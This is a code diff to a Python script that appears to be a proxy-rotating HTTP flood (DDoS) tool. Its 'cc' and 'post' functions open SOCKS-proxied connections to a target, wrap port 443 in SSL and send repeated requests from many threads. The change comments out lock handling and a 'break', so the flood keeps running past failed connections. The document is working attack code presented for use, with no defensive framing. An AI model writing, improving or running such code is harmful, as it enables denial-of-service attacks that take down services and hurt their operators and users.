@@ -222,16 +222,16 @@ def cc(socks_type):
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 3:
-				with lock:
-					fail_count += 1
+				# with lock:
+				fail_count += 1
 				print("[!] ["+str(success_count)+"/"+str(fail_count)+"] Target or proxy maybe down| Changing proxy")
-				break
+				# break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-			with lock:
-				success_count += 1
+			# with lock:
+			success_count += 1
 			print ("[*] ["+str(success_count)+"/"+str(fail_count)+"] "+n+" From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
@@ -270,17 +270,17 @@ def post(socks_type):
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 3:
-				with lock:
-					fail_count += 1
+				# with lock:
+				fail_count += 1
 				print("[!] ["+str(success_count)+"/"+str(fail_count)+"] Target or proxy maybe down| Changing proxy")
-				break
+				# break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			with lock:
-				success_count += 1
+			# with lock:
+			success_count += 1
 			print ("[*] ["+str(success_count)+"/"+str(fail_count)+"] "+n+" POST From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
@@ -683,7 +683,7 @@ def main():
 				th.setDaemon(True)
 				th.start()
 				time.sleep(0.03)
-					#print("Threads "+str(i+1)+" created")
+				#print("Threads "+str(i+1)+" created")
 	try:
 		while True:
 			pass
